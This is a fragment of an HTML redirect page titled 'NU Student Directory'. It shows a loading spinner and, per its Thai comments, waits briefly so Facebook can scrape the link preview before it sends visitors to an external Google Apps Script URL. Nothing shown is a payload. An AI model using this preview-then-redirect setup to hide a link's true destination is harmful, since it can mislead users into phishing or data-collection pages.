    <meta property="og:title" content="NU Student Directory">

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #f3f4f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #4b5563;
        }
        .container { text-align: center; }
        .spinner {
            border: 4px solid #e5e7eb;
            border-top: 4px solid #3b82f6;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>

    <script>
        // ==========================================
        // ใส่ลิงก์ Google Apps Script ของคุณตรงนี้ !!!
        // ==========================================
        const gasUrl = "https://script.google.com/macros/s/AKfycby5JNLkqiFHiCqaTyyWQRCnjrapLZ6i4lV77_sNeDPtNhGVnHy43O3nnz5s1s1tOaHKAA/exec"; 

        // คำสั่ง Redirect (นับถอยหลัง 1 วินาทีแล้วไป)
        window.onload = function() {
            setTimeout(function() {
                window.location.replace(gasUrl);
            }, 800); // 800ms คือเวลาหน่วงนิดนึงเพื่อให้ Facebook เก็บข้อมูลทัน
        };
    </script>
</head>
<body>
